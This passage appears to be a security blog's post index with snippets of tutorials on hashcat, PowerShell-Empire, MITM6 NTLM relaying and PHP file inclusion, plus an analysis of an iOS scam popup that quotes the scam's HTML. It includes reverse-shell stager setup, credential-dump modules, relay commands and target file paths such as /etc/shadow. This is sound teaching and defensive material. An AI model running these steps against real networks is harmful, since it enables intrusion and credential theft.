vBulletin &gt;= v3.8.5 | Forums, CMS, E-Commerce 25600 | bcrypt(md5($pass)) / bcryptmd5 | Forums, CMS, E-Commerce 25800 | bcrypt(sha1($pass)) / bcryptsha1 | Forums, CMS, E-Commerce 28400 | bcrypt(sha512($pass)) / bcryptsha512 | Forums, CMS, E-Commerce 21 | osCommerce, xt:Commerce | Forums, CMS, E-Commerce 18100 | TOTP (HMAC-SHA1) | One-Time Password 2000 | STDOUT | Plaintext 99999 | Plaintext | Plaintext 21600 | Web2py pbkdf2-sha512 | Framework 10000 | Django (PBKDF2-SHA256) | Framework 124 | Django (SHA-1) | Framework 12001 | Atlassian (PBKDF2-HMAC-SHA1) | Framework 19500 | Ruby on Rails Restful-Authentication | Framework 27200 | Ruby on Rails Restful Auth (one round, no sitekey) | Framework 30000 | Python Werkzeug MD5 (HMAC-MD5 (key = $salt)) | Framework 30120 | Python Werkzeug SHA256 (HMAC-SHA256 (key = $salt)) | Framework 20200 | Python passlib pbkdf2-sha512 | Framework 20300 | Python passlib pbkdf2-sha256 | Framework 20400 | Python passlib pbkdf2-sha1 | Framework 24410 | PKCS#8 Private Keys (PBKDF2-HMAC-SHA1 + 3DES/AES) | Private Key 24420 | PKCS#8 Private Keys (PBKDF2-HMAC-SHA256 + 3DES/AES) | Private Key 15500 | JKS Java Key Store Private Keys (SHA1) | Private Key 22911 | RSA/DSA/EC/OpenSSH Private Keys ($0$) | Private Key 22921 | RSA/DSA/EC/OpenSSH Private Keys ($6$) | Private Key 22931 | RSA/DSA/EC/OpenSSH Private Keys ($1, $3$) | Private Key 22941 | RSA/DSA/EC/OpenSSH Private Keys ($4$) | Private Key 22951 | RSA/DSA/EC/OpenSSH Private Keys ($5$) | Private Key 23200 | XMPP SCRAM PBKDF2-SHA1 | Instant Messaging Service 28300 | Teamspeak 3 (channel hash) | Instant Messaging Service 22600 | Telegram Desktop &lt; v2.1.14 (PBKDF2-HMAC-SHA1) | Instant Messaging Service 24500 | Telegram Desktop &gt;= v2.1.14 (PBKDF2-HMAC-SHA512) | Instant Messaging Service 22301 | Telegram Mobile App Passcode (SHA256) | Instant Messaging Service 23 | Skype | Instant Messaging Service 29600 | Terra Station Wallet (AES256-CBC(PBKDF2($pass))) | Cryptocurrency Wallet 26600 | MetaMask Wallet | Cryptocurrency Wallet 21000 | BitShares v0.x - sha512(sha512_bin(pass)) | Cryptocurrency Wallet 28501 | Bitcoin WIF private key (P2PKH), compressed | Cryptocurrency Wallet 28502 | Bitcoin WIF private key (P2PKH), uncompressed | Cryptocurrency Wallet 28503 | Bitcoin WIF private key (P2WPKH, Bech32), compressed | Cryptocurrency Wallet 28504 | Bitcoin WIF private key (P2WPKH, Bech32), uncompressed | Cryptocurrency Wallet 28505 | Bitcoin WIF private key (P2SH(P2WPKH)), compressed | Cryptocurrency Wallet 28506 | Bitcoin WIF private key (P2SH(P2WPKH)), uncompressed | Cryptocurrency Wallet 11300 | Bitcoin/Litecoin wallet.dat | Cryptocurrency Wallet 16600 | Electrum Wallet (Salt-Type 1-3) | Cryptocurrency Wallet 21700 | Electrum Wallet (Salt-Type 4) | Cryptocurrency Wallet 21800 | Electrum Wallet (Salt-Type 5) | Cryptocurrency Wallet 12700 | Blockchain, My Wallet | Cryptocurrency Wallet 15200 | Blockchain, My Wallet, V2 | Cryptocurrency Wallet 18800 | Blockchain, My Wallet, Second Password (SHA256) | Cryptocurrency Wallet 25500 | Stargazer Stellar Wallet XLM | Cryptocurrency Wallet 16300 | Ethereum Pre-Sale Wallet, PBKDF2-HMAC-SHA256 | Cryptocurrency Wallet 15600 | Ethereum Wallet, PBKDF2-HMAC-SHA256 | Cryptocurrency Wallet 15700 | Ethereum Wallet, SCRYPT | Cryptocurrency Wallet 22500 | MultiBit Classic .key (MD5) | Cryptocurrency Wallet 27700 | MultiBit Classic .wallet (scrypt) | Cryptocurrency Wallet 22700 | MultiBit HD (scrypt) | Cryptocurrency Wallet 28200 | Exodus Desktop Wallet (scrypt) | Cryptocurrency Wallet- [ Brain Client Features ] - # | Features ===+======== 1 | Send hashed passwords 2 | Send attack positions 3 | Send hashed passwords and attack positions- [ Outfile Formats ] - # | Format ===+======== 1 | hash[:salt] 2 | plain 3 | hex_plain 4 | crack_pos 5 | timestamp absolute 6 | timestamp relative- [ Rule Debugging Modes ] - # | Format ===+======== 1 | Finding-Rule 2 | Original-Word 3 | Original-Word:Finding-Rule 4 | Original-Word:Finding-Rule:Processed-Word 5 | Original-Word:Finding-Rule:Processed-Word:Wordlist- [ Attack Modes ] - # | Mode ===+====== 0 | Straight 1 | Combination 3 | Brute-force 6 | Hybrid Wordlist + Mask 7 | Hybrid Mask + Wordlist 9 | Association- [ Built-in Charsets ] - ? | Charset ===+========= l | abcdefghijklmnopqrstuvwxyz [a-z] u | ABCDEFGHIJKLMNOPQRSTUVWXYZ [A-Z] d | 0123456789 [0-9] h | 0123456789abcdef [0-9a-f] H | 0123456789ABCDEF [0-9A-F] s | !\"#$%&amp;'()*+,-./:;&lt;=&gt;?@[\\]^_`{|}~ a | ?l?u?d?s b | 0x00 - 0xff- [ OpenCL Device Types ] - # | Device Type ===+============= 1 | CPU 2 | GPU 3 | FPGA, DSP, Co-Processor- [ Workload Profiles ] - # | Performance | Runtime | Power Consumption | Desktop Impact ===+=============+=========+===================+================= 1 | Low | 2 ms | Low | Minimal 2 | Default | 12 ms | Economic | Noticeable 3 | High | 96 ms | High | Unresponsive 4 | Nightmare | 480 ms | Insane | Headless- [ License ] - hashcat is licensed under the MIT license Copyright and license terms are listed in docs/license.txt- [ Basic Examples ] - Attack- | Hash- | Mode | Type | Example command ==================+=======+================================================================== Wordlist | $P$ | hashcat -a 0 -m 400 example400.hash example.dict Wordlist + Rules | MD5 | hashcat -a 0 -m 0 example0.hash example.dict -r rules/best64.rule Brute-Force | MD5 | hashcat -a 3 -m 0 example0.hash ?a?a?a?a?a?a Combinator | MD5 | hashcat -a 1 -m 0 example0.hash example.dict example.dict Association | $1$ | hashcat -a 9 -m 500 example500.hash 1word.dict -r rules/best64.ruleIf you still have no idea what just happened, try the following pages:* https://hashcat.net/wiki/#howtos_videos_papers_articles_etc_in_the_wild* https://hashcat.net/faq/If you think you need help by a real human come to the hashcat Discord:* https://hashcat.net/discordInstructionsCracking NTLM Hasheshashcat -m 5600 -a 0 %CREDS.TXT% /usr/share/wordlists/rockyou.txtSources" }, { "title": "PowerShell-Empire", "url": "/posts/PowerShell-Empire/", "categories": "Ethical Hacking Tools, Frameworks and Suites", "tags": "powershell-empire, starkiller, powerview, mimkatz, credential access (TA0006), privilege escalation (TA0004), discovery (TA0007), collection (TA0009)", "date": "2022-10-21 00:00:00 +1100", "snippet": "OverviewPowerShell-Empire is a post-exploitation framework that is built upon a large collection of PowerShell modules and scripts. It also contains various scripts written in C# and Python that can be used against a target OS. The PowerShell-Empire framework currently has hundreds of modules that can aid in almost all penetration testing tactics and techniques.PowerShell-Empire have also developed a front-end GUI called Starkiller for the framework which makes configuration and activities that little bit easier to manage, especially when dealing with multiple targets. However, there is still the CLI available, with the framework running a server/client model.Kali Linux comes with PowerShell-Empire and Starkiller pre-installed. 1 Tool Name Version MITRE ATT&amp;CK Tactic MITRE ATT&amp;CK Technique PowerShell-Empire V4.8.0 Credential Access Privilege Escalation Discovery Collection Command and Control Exfiltration Execution Persistence Defense Evasion Lateral Movement   Starting PowerShell-Empire with Starkiller on Kali Linux Start the PowerShell-Empire Server and Client in separate terminal windows. Ensure that the server is operational prior to starting the client to ensure that they can communicate. sudo powershell-empire server sudo powershell-empire client Create a new user on the PowerShell-Empire Client. Once the new user has been created, the PowerShell-Empire Client terminal can be closed if using the Starkiller GUI, otherwise the client is the interface to be used for configuring and interacting with agents. (Empire) &gt; admin (Empire) &gt; create_user %USERNAME% %PASSWORD% Open Starkiller and logon using the credentials set in the previous section. The URL by default is set to https://localhost:1337. Adding a Listener through Starkiller Navigate to the Listener window Press the create button on the top right to enter the New Listener prompt and select the type of listener using the drop-down menu. For this example, the HTTP Listener is selected. Configure the Listener as below: Name: darkcybeHttp Host: 172.16.2.2 Port: 1335 Press submit to initiate the HTTP Listener Additional configuration can be set, such as: KillDate: An expiration date that sets agent autocleanup DefaultProfile: Sets the URL GET request parameters to blend into normal traffic UserAgent: Set the UA string, useful to masquerade traffic ServerVersion: Set to a common Server Header to masquerade traffic Adding a Stager through Starkiller Navigate to the Stager window Press the create button on the top right to enter the New Stager prompt and select the type of stager using the drop-down menu. For this example, the windows/reverseshell is selected. Configure the Stager as below: Listener: darkcybeHttp LocalHost: 172.16.2.2 Press submit to create the stager. The stager can then be downloaded and transferred to the target host. Payloads can be created for Windows, MacOs, and Linux.Interacting with Agents through Starkiller When a target executes the stager, the agent will connect to the Listener and be displayed on the Agents window, as per the image below: Selecting the agent will open an agent specific window containing a number of different options: Interact: Allows for shell commands and PowerShell-Empire Modules to be executed on the agent. File Browser: Directory traversal including file upload and download functionality. Tasks: A history of actions carried out on the host View: Agent specific configuration PowerShell-Empire ModulesDiscovery ModulesWhen executing the Bloodhound modules, the Sharphound archive defaults to C:\\Users\\%USERNAME%\\ on the target agent. The download directory on the attacking Kali host is /var/lib/powershell-empire/server/downloads/%AGENT%/. Action Module Configuration Find a Domain Controller powershell/situational_awareness/network/powerview/get_domain_controller   Identify Antivirus powershell/situational_awareness/host/antivirusproduct   Bloodhound AD Scanning powershell/situational_awareness/network/bloodhound3   Credential Access ModulesUsing the Mimkatz LogonPasswords modules automatically adds collected credentials to the credentials window within PowerShell-Empire. Action Module Configuration Mimkatz Password Dump powershell/credentials/mimikatz/logonpasswords   Browser Credential Dump powershell/collection/FoxDump powershell/collection/ChromeDump   Responder/Inveigh LLMNR Abuse powershell/collection/inveigh   Lateral Movement Modules Action Module Configuration       Privilege Escalation Modules Action Module Configuration Get SYSTEM Privileges powershell/privesc/getsystem   Search for Privesc Vulnerabilities powershell/privesc/sherlock powershell/privesc/powerup/allchecks   Sources Kali Linux - PowerShell-Empire &#8617; " }, { "title": "MITM6", "url": "/posts/MITM6/", "categories": "Ethical Hacking Tools, Credential Access", "tags": "mitm6, credential access (TA0006), aitm, mitm, ntlmv2, kerberos", "date": "2022-10-17 00:00:00 +1100", "snippet": "OverviewMITM6 is a pentesting tool that exploits the default configuration of Windows to take over the default DNS server. It does this by replying to DHCPv6 messages, providing victims with a link-local IPv6 address and setting the attackers host as default DNS server. As DNS server, MITM6 will selectively reply to DNS queries of the attackers choosing and redirect the victims traffic to the attacker machine instead of the legitimate server. 1MITM6 is also able to conduct credential relay attacks using the IMPacket NTLMrelayx tool to relay NTLM credentials for authentication and the krbrelayx tool that allows Kerberos authenitcation relays.MITM6 comes packaged with Kali Linux by default. Tool Name Version MITRE ATT&amp;CK Tactic MITRE ATT&amp;CK Technique mitm6 v0.3.0 Credential Access Adversary-in-the-Middle MITM6 Help Pageusage: mitm6 [-h] [-i INTERFACE] [-l LOCALDOMAIN] [-4 ADDRESS] [-6 ADDRESS] [-m ADDRESS] [-a] [-r TARGET] [-v] [--debug] [-d DOMAIN] [-b DOMAIN] [-hw DOMAIN] [-hb DOMAIN] [--ignore-nofqdn]mitm6 - pwning IPv4 via IPv6For help or reporting issues, visit https://github.com/dirkjanm/mitm6optional arguments: -h, --help show this help message and exit -i INTERFACE, --interface INTERFACE Interface to use (default: autodetect) -l LOCALDOMAIN, --localdomain LOCALDOMAIN Domain name to use as DNS search domain (default: use first DNS domain) -4 ADDRESS, --ipv4 ADDRESS IPv4 address to send packets from (default: autodetect) -6 ADDRESS, --ipv6 ADDRESS IPv6 link-local address to send packets from (default: autodetect) -m ADDRESS, --mac ADDRESS Custom mac address - probably breaks stuff (default: mac of selected interface) -a, --no-ra Do not advertise ourselves (useful for networks which detect rogue Router Advertisements) -r TARGET, --relay TARGET Authentication relay target, will be used as fake DNS server hostname to trigger Kerberos auth -v, --verbose Show verbose information --debug Show debug informationFiltering options: -d DOMAIN, --domain DOMAIN Domain name to filter DNS queries on (Allowlist principle, multiple can be specified.) -b DOMAIN, --blocklist DOMAIN, --blacklist DOMAIN Domain name to filter DNS queries on (Blocklist principle, multiple can be specified.) -hw DOMAIN, -ha DOMAIN, --host-allowlist DOMAIN, --host-whitelist DOMAIN Hostname (FQDN) to filter DHCPv6 queries on (Allowlist principle, multiple can be specified.) -hb DOMAIN, --host-blocklist DOMAIN, --host-blacklist DOMAIN Hostname (FQDN) to filter DHCPv6 queries on (Blocklist principle, multiple can be specified.) --ignore-nofqdn Ignore DHCPv6 queries that do not contain the Fully Qualified Domain Name (FQDN) option.InstructionsUsing MITM6 to Perform a NTLM Relay Attack Execute the below command on the attacker machine. Ensure that the -i switch is set to interface that is on the same network as the target and that -d is set to the local domain being targeted. sudo mitm6 -i eth0 -d darkcybe.malnet Using the IMPacket ntlmrelayx.py script, set the target using the -t switch which in this example is set to the Domain Controller running LDAPS. -wh is set to name the malicious WPAD instance and -l to create a local file on the attacker machine in which the discovered loot will be dropped. 2 ntlmrelayx.py -6 -t ldaps://10.10.10.10 -wh malwpad.darkcybe.malnet -l lootcrate Sources Dirkjanm/mitm6 - Github &#8617; Dirkjanm.io - The worst of both worlds: Combining NTLM Relaying and Kerberos delegation &#8617; " }, { "title": "SrumECmd", "url": "/posts/SrumECmd/", "categories": "DFIR Tools, Program Execution", "tags": "srum, srumecmd, ez tools, execution (T0002)", "date": "2022-10-17 00:00:00 +1100", "snippet": "OverviewSrumECmd is a command line tool developed by Eric Zimmerman, to process the SRUM Database on Windows operating systems, identifying items such as: Executable filepaths Timestamps of execution times Byte read/write processed by an application Power Consumption details Network Connection details Details of push notificationsFurther Information the SRUM can be found on Darkcybe - Evidence of Execution Tool Name Version MITRE ATT&amp;CK Tactic MITRE ATT&amp;CK Technique SrumECmd V0.5.1.0 Execution   InstructionsParsing a Live or Copied SRUM.dat DatabaseThe default location for the SRUM database is C:\\Windows\\System32\\SRU\\. The database can be interrogated on a live system or against a collected copy of the SRUM database.SrumECmd.exe -f C:\\Windows\\System32\\sru\\SRUDB.dat --csv /path/to/outputOutputSrumECmd will produce a number of .csv files on completion of the tools execution with differing objects of interest in each. Examples of the output of the tool for a number of the objects can be seen below. App Resource Usage Network Connection Network Usage Unknown 312 Unknown D8F " }, { "title": "Hypertext Preprocessor (PHP)", "url": "/posts/PHP/", "categories": "Ethical Hacking, Common Ports and Services", "tags": "php, lfi, rfi, responder", "date": "2022-10-10 00:00:00 +1100", "snippet": "OverviewPHP is a popular general-purpose scripting language that is especially suited to web development. Fast, flexible and pragmatic, PHP powers everything from your blog to the most popular websites in the world. It is often identified as an underlying language for many websites and is susceptible to various vulnerabilities.ReconnaissanceIdentifying if a website is utilizing PHP can be achieved by using the browsers built-in developer mode (F12), or by using a number of specialized tools. A couple of examples that have the ability to parse website data to provides a list of underlying technologies are below. They both also have a handy browser plug-in to check technologies on the fly. Wappalyzer: Built WithExploitationPHP, as stated in the overview, is susceptible to a number of vulnerabilities.Local File Inclusion (LFI) 1LFI allows an attacker to target a specific vulnerability in PHP to access files or run applications not intended to be executed. By injecting path traversal characters into the URL of a vulnerable server. Survey application: Identification of the vulnerability can be passively achieved by navigating the target website and looking for an indicator that specifically calls a file or page, such as the example URL below in which the page= parameter is calling a file named contact.php. https://darkcybe.vuln/?page=contact.php Attempt variations on input parameters: Once a vulnerable website and target file reference has been identified, the attack can move into an active phase where variations of different parameters can be attempted. As PHP can run on both Windows Server and Linux operating systems, path traversal strings and target files should be crafted to suit. As this is an active phase, activities may be recorded if the victim server is monitoring web logs. Windows C:/WINDOWS/System32/drivers/etc/hosts Linux etc/passwd A more verbose word list containing path traversal strings has been collated by ZSecure for Linux 2 and Windows 3. There are also automated tools such as fimap. Exploiting LFI: If input validation was successful in the previous step, LFI can be exploited to access files on the victim host. Another valuable method, however it does require the victim and attacker hosts to be on the same network, is to leverage leverage the ability for remote pages to be loaded whilst Responder is running on the attacker machine to gather NTLMv2 credentials from Windows hosts.Remote File Inclusion (RFI)RFI allows an attacker to dynamically reference scripts hosted on an external server and execute them locally.Sources Darkcybe - CAPEC 252-PHP LFI &#8617; ZSecure - Linux: Path Traversal/LFI Wordlist &#8617; ZSecure - Windows: Path Traversal/LFI Wordlist &#8617; " }, { "title": "CAPEC 252 - PHP Local File Inclusion (LFI)", "url": "/posts/252-PHP_LFI/", "categories": "Ethical Hacking, CAPEC", "tags": "php, lfi", "date": "2022-10-10 00:00:00 +1100", "snippet": "OverviewPHP, as many other languages, allows the inclusion of files in order to provide or extend the functionality of the current file 1. Local File Inclusion (LFI) attacks can exploit this file inclusion vulnerability on PHP web servers by running or exposing files. LFI attacks can also be extended with Remote File Inclusion (RFI) attacks that allow for scripts hosted on remote servers to be executed locally.The attacker loads and executes an arbitrary local PHP file on a target machine. The attacker could use this to try to load old versions of PHP files that have known vulnerabilities, to load PHP files that the attacker placed on the local machine during a prior attack, or to otherwise change the functionality of the targeted application in unexpected ways. 2Techniques Explore Survey application: Using a browser or an automated tool, an adversary follows all public links on a web site. They record all the links they find. The adversary is looking for URLs that show PHP file inclusion is used, which can look something like http://vulnerable-website/file.php?file=index.php. Use a spidering tool to follow and record all links. Make special note of any links that include parameters in the URL. Use a proxy tool to record all links visited during a manual traversal of the web application. Make special note of any links that include parameters in the URL. Manual traversal of this type is frequently necessary to identify forms that are GET method forms rather than POST forms. Use a browser to manually explore the website and analyze how it is constructed. Many browser’s plugins are available to facilitate the analysis or automate the URL discovery. Experiment Attempt variations on input parameters: Once the adversary finds a vulnerable URL that takes file input, they attempt a variety of path traversal techniques to attempt to get the application to display the contents of a local file, or execute a different PHP file already stored locally on the server. Use a list of probe strings to inject in parameters of known URLs. The probe strings are variants of path traversal techniques used include well known files. Use a proxy tool to record results of manual input of local file inclusion probes in known URLs. Exploit Include desired local file: Once the adversary has determined which techniques of path traversal successfully work with the vulnerable PHP application, they will target a specific local file to include. These can be files such as /etc/passwd, /etc/shadow, or configuration files for the application that might expose sensitive information. Sources Brightsec - LFI Attack Real Life Attacks and Attack Examples OWASP - PHP File Inclusion &#8617; CAPEC-252: PHP Local File Inclusion &#8617; " }, { "title": "iOS Scam Popups", "url": "/posts/IOS-Scam/", "categories": "DFIR, Threat Summaries", "tags": "ios", "date": "2022-10-09 00:00:00 +1100", "snippet": "OverviewMy girlfriend was today playing an iOS game downloaded through the app store that presented a popup stating that her iPhone had been hacked! It is not unusual for free game downloaded to present the user with popups, usually to display advertisements in a bid for the app developer to receive income. Many games will also allow a user the option to watch additional advertisements to speed up progress or to gain in-game currency or other rewards.In this particular instance, the game presented the below popup. Of immediate suspicion is the URL and website title mismatch, with the popup masquerading as a legitimate is that of AppleCare Plus. The tried method of instilling a sense of urgency to the end user is leveraged with an proclamation that the target device has been hacked and that immediate action is required.Breaking down the URL grants the following information: linkthetrafficmedia.com/ linkthetrafficmedia as the parent domain is a add serving provider. Address: 104.21.94.70 (CloudFlare CDN) HFmx46Qr The filename of the page being served. HTML code on the page did not consist of anything of interest and appears to be statically set. This value is highly likely to change. cost=0.001972746 Possible cost per add served? external_id=166529318109990TAUTV49836334174V251 Possible service identification? ad_campaign_id=304067220 An identification number for the add campaign source=6307776-624692278-4260646726 Possible user identification? The popup presents the user with only two options, close the popup or select the ‘ok’ button to proceed. Pressing the ‘ok’ button launches a new tab in the default browser, navigating to a page that declares that the device has been compromised. The campaign utilizes AppleCare Plus branding once again and with the display as below mimicking the Apple iPhone menu with an added &lt; Settings text displayed in the top left corner to fool the user into thinking the view is perhaps linked to their Apple account or iPhone settings. Exiting out of the popup does not launch any further popups or windows.A time is presented to the user which is created via an embedded script titled ‘common.js’ that presents the user with a 90 second timer in an attempt to pressure them into taking action by clicking on two buttons, Settings or Ok. Both buttons are assigned a variable of btns and added to an event listener which will close the warning. The page displayed has static values applied to the Payment &amp; Shipping objects, iCloud, Media &amp; Purchases, and Find My. These statically set values are done so within the HTML code.var now_seconds = 90, timer = document.getElementsByClassName(\"modal-timer\")[0], minus_sec = function () { now_seconds-- if(now_seconds &gt; 0) { var m = parseInt(now_seconds / 60), s = now_seconds - m * 60 + \"\" if (s.length &lt;= 1) s = \"0\" + s timer.innerHTML = m + \":\" + s setTimeout(minus_sec, 1000) }else{ timer.innerHTML = \"0:00\" } }minus_sec()var modal = document.getElementsByClassName(\"modal\")[0], btns = document.getElementsByClassName(\"modal-btn\")for(var btn of btns) btn.addEventListener(\"click\", function (e) { e.preventDefault() modal.style.display = \"none\"})Upon Pressing the Repair now button, an on-click function refers the user to a legitimate Apple Apps page via for an Advertisement Blocking app. Subsequent download of apps in this manner often lead to the user being subjected to further advertisement popups, subscription services that abuse sense of urgency, and potentially the download of malicious packages that can result in the theft of personal information. Applications delivered in this manner are referred to as Potentially Unwanted Applications (PUAs).&lt;html lang=\"en\"&gt;&lt;head&gt;&lt;base href=\"/lander/applecare-plus8-1/index.html\"&gt; &lt;meta charset=\"utf-8\"&gt; &lt;title&gt;AppleCare Plus&lt;/title&gt; &lt;link rel=\"shortcut icon\" href=\"1/favicon.png\" type=\"image/png\"&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no\"&gt; &lt;link rel=\"stylesheet\" type=\"text/css\" href=\"1/SanFrancisco/stylesheet.css?rand=1.0\" /&gt; &lt;link rel=\"stylesheet\" type=\"text/css\" href=\"1/common.css?v=1.0\" /&gt; &lt;script src=\"https://analytics-active.com/js.php\" async&gt;&lt;/script&gt; &lt;meta name=\"theme-color\" content=\"#FF0000\" media=\"(prefers-color-scheme: light)\"&gt; &lt;meta name=\"theme-color\" content=\"#FF0000\" media=\"(prefers-color-scheme: dark)\"&gt; &lt;script&gt;alert('Your Apple iPhone has been hacked. All operations on your device are being tracked by the hacker. Immediate action is required!');//window.stats(r());&lt;/script&gt;&lt;/head&gt;&lt;body style=\"background-color: #000000\"&gt; &lt;a onclick=\"location.href = 'https://linkthetrafficmedia.com/?_lp=1&amp;_token=uuid_2vl208749tdo1_2vl208749tdo16342668946aaf0.69908637'; return false;\" class=\"page\"&gt; &lt;div class=\"page-left\"&gt; &lt;div class=\"logo\"&gt; &lt;div class=\"logo__ico\"&gt;&lt;/div&gt; &lt;div class=\"logo__title\"&gt;AppleCare Plus&lt;/div&gt; &lt;div class=\"logo__desc\"&gt;Protection System&lt;/div&gt; &lt;/div&gt; &lt;div class=\"settings\"&gt; &lt;div&gt;&lt;/div&gt; &lt;div&gt;Settings&lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=\"page-right\"&gt; &lt;div class=\"items\"&gt; &lt;div class=\"item\"&gt; &lt;div&gt;Name, Phone Numbers, Email&lt;/div&gt; &lt;div class=\"arrow\"&gt;&lt;/div&gt; &lt;/div&gt; &lt;div class=\"item\"&gt; &lt;div&gt;Password &amp; Security&lt;/div&gt; &lt;div class=\"arrow\"&gt;&lt;/div&gt; &lt;/div&gt; &lt;div class=\"item\"&gt; &lt;div&gt;Payment &amp; Shipping&lt;/div&gt; &lt;div class=\"arrow-card\"&gt;&lt;div&gt;Mastercard&lt;/div&gt;&lt;div class=\"arrow\"&gt;&lt;/div&gt;&lt;/div&gt; &lt;/div&gt; &lt;div class=\"item\"&gt; &lt;div&gt;Subscriptions&lt;/div&gt; &lt;div class=\"arrow\"&gt;&lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=\"items red\"&gt; &lt;div class=\"item with-ico\"&gt; &lt;div class=\"ico-name\"&gt;&lt;div class=\"ico-icloud\"&gt;&lt;/div&gt;&lt;div&gt;iCloud&lt;/div&gt;&lt;/div&gt; &lt;div class=\"arrow-compromised\"&gt;&lt;div&gt;Compromised&lt;/div&gt;&lt;div class=\"arrow\"&gt;&lt;/div&gt;&lt;/div&gt; &lt;/div&gt; &lt;div class=\"item with-ico\"&gt; &lt;div class=\"ico-name\"&gt;&lt;div class=\"ico-appstore\"&gt;&lt;/div&gt;&lt;div&gt;Media &amp; Purchases&lt;/div&gt;&lt;/div&gt; &lt;div class=\"arrow-compromised\"&gt;&lt;div&gt;Compromised&lt;/div&gt;&lt;div class=\"arrow\"&gt;&lt;/div&gt;&lt;/div&gt; &lt;/div&gt; &lt;div class=\"item with-ico\"&gt; &lt;div class=\"ico-name\"&gt;&lt;div class=\"ico-locator\"&gt;&lt;/div&gt;&lt;div&gt;Find My&lt;/div&gt;&lt;/div&gt; &lt;div class=\"arrow-compromised\"&gt;&lt;div&gt;Compromised&lt;/div&gt;&lt;div class=\"arrow\"&gt;&lt;/div&gt;&lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=\"item-phone\"&gt; &lt;div class=\"phone__ico\"&gt;&lt;/div&gt; &lt;div class=\"phone__name\"&gt; &lt;div&gt;iPhone&lt;/div&gt; &lt;div&gt;This iPhone&lt;/div&gt; &lt;/div&gt; &lt;div class=\"arrow\"&gt;&lt;/div&gt; &lt;/div&gt; &lt;div class=\"btn\"&gt;Repair now&lt;/div&gt; &lt;/div&gt; &lt;/a&gt; &lt;div class=\"modal\"&gt; &lt;div class=\"modal-content\"&gt; &lt;div class=\"modal-top\"&gt; &lt;div class=\"modal-title\"&gt;Your device Apple iPhone has been hacked&lt;/div&gt; &lt;div class=\"modal-text\"&gt;Your device needs to be repair immediately. Otherwise your Facebook, WhatsApp, Instagram data will be compromised&lt;/div&gt; &lt;div class=\"modal-text modal-timer\"&gt;1:30&lt;/div&gt; &lt;/div&gt; &lt;dov class=\"modal-btns\"&gt; &lt;div class=\"modal-btn\"&gt;Settings&lt;/div&gt; &lt;div class=\"modal-btn\"&gt;OK&lt;/div&gt; &lt;/dov&gt; &lt;/div&gt; &lt;/div&gt; &lt;script src=\"1/common.js?rand=1.0\"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;RemediationIf a user falls victim to such attack, it is highly recommended to take the following remediation actions for Safari. Other web browsers such as Microsoft Edge, Mozilla Firefox and Google Chrome will have similar procedures: Clear iPhone/iPad History and Data Settings &gt; Safari Clear History and Website Data Disallow JavaScript Execution Settings &gt; Safari &gt; Settings &gt; Advanced Toggle the JavaScript button to off Apple provide a great reference for Recognizing and avoiding phishing messages, phony support calls, and other scams.IOCs Object Value Description URL hxxps://linkthetrafficmedia.com/HFmx46Qr Serves popup through advertisement. IP 104.21.94.70 CloudFlare CDN hosting linkthetrafficmedia App Neo Protect: AdBlock Application offers AdBlocking services, subscription service is offered at USD$7.99 per week. App Store URL : hxxps://apps.apple.com/kg/app/neo-protect-adblock/id1572287518 " }, { "title": "Privilege Escalation", "url": "/posts/Privilege_Escalation/", "categories": "Ethical Hacking, Tactics and Techniques", "tags": "privilege escalation (TA0004)", "date": "2022-10-06 00:00:00 +1100", "snippet": "OverviewThe adversary is trying to gain higher-level permissions.Privilege Escalation consists of techniques that adversaries use to gain higher-level permissions on a system or network. Adversaries can often enter and explore a network with unprivileged access but require elevated permissions to follow through on their objectives. Common approaches are to take advantage of system weaknesses, misconfigurations, and vulnerabilities. Examples of elevated access include: SYSTEM/root level local administrator user account with admin-like access user accounts with access to specific system or perform specific functionThese techniques often overlap with Persistence techniques, as OS features that let an adversary persist can execute in an elevated context. 1Sources MITRE ATT&amp;CK - Privilege Escalation TA0004 &#8617; " }, { "title": "Persistence", "url": "/posts/Persistence/", "categories": "Ethical Hacking, Tactics and Techniques", "tags": "persistence (TA0003)", "date": "2022-10-06 00:00:00 +1100", "snippet": "OverviewThe adversary is trying to maintain their foothold.Persistence consists of techniques that adversaries use to keep access to systems across restarts, changed credentials, and other interruptions that could cut off their access. Techniques used for persistence include any access, action, or configuration changes that let them maintain their foothold on systems, such as replacing or hijacking legitimate code or adding startup code. 1Sources MITRE ATT&amp;CK - Persistence TA0003 &#8617; " }, { "title": "Lateral Movement", "url": "/posts/Lateral_Movement/", "categories": "Ethical Hacking, Tactics and Techniques", "tags": "lateral movement (TA0008)", "date": "2022-10-06 00:00:00 +1100", "snippet": "OverviewThe adversary is trying to move through your environment.Lateral Movement consists of techniques that adversaries use to enter and control remote systems on a network. Following through on their primary objective often requires exploring the network to find their target and subsequently gaining access to it. Reaching their objective often involves pivoting through multiple systems and accounts to gain. Adversaries might install their own remote access tools to accomplish Lateral Movement or use legitimate credentials with native network and operating system tools, which may be stealthier. 1Use Alternate Authentication MaterialAdversaries may use alternate authentication material, such as password hashes, Kerberos tickets, and application access tokens, in order to move laterally within an environment and bypass normal system access controls. 2Pass The HashAdversaries may “pass the hash” using stolen password hashes to move laterally within an environment, bypassing normal system access controls. Pass the hash (PtH) is a method of authenticating as a user without having access to the user’s cleartext password. This method bypasses standard authentication steps that require a cleartext password, moving directly into the portion of the authentication that uses the password hash.There are multiple tools available to conduct Pass The Hash attacks, such as: CrackMapExec PowerShell-Empire Mimikatz Cobalt StrikeSpecific techniques to conduct PtH attacks can be found on the CAPEC 644 - Use of Captured Hashes (Pass The Hash) post.Access Token ManipulationAdversaries may modify access tokens to operate under a different user or system security context to perform actions and bypass access controls. Windows uses access tokens to determine the ownership of a running process. A user can manipulate access tokens to make a running process appear as though it is the child of a different process or belongs to someone other than the user that started the process. When this occurs, the process also takes on the security context associated with the new token. 3Token Impersonation/TheftAdversaries may duplicate then impersonate another user’s token to escalate privileges and bypass access controls. An adversary can create a new access token that duplicates an existing token using DuplicateToken(Ex). The token can then be used with ImpersonateLoggedOnUser to allow the calling thread to impersonate a logged on user’s security context, or with SetThreadToken to assign the impersonated token to a thread.An adversary may do this when they have a specific, existing process they want to assign the new token to. For example, this may be useful for when the target user has a non-network logon session on the system. 4Specific techniques to conduct token impersonation/theft attacks can be found on the CAPEC 633 - Token Impersonation post.Sources MITRE ATT&amp;CK - Lateral Movement &#8617; MITRE ATT&amp;CK - Use Alternate 